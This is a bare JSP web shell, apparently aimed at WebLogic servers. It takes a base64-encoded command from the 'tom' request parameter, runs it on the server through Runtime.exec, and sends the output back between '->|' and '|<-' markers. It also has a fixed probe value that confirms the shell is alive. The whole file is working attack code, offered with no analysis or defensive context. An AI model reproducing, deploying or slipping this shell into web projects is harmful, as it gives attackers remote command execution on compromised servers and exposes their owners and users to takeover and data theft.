
<%@page import="java.io.*"%>
<%@page import="sun.misc.BASE64Decoder"%>
<%
try {
String cmd = request.getParameter("tom");
String path=application.getRealPath(request.getRequestURI());
String dir="weblogic";
if(cmd.equals("NzU1Ng")){out.print("[S]"+dir+"[E]");}
byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);
String kcmd = new String(binary);
Process child = Runtime.getRuntime().exec(kcmd);
InputStream in = child.getInputStream();
out.print("->|");
int c;
while ((c = in.read()) != -1) {
out.print((char)c);
}
in.close();
out.print("|<-");
try {
child.waitFor();
} catch (InterruptedException e) {
e.printStackTrace();
}
} catch (IOException e) {
System.err.println(e);
}
%>
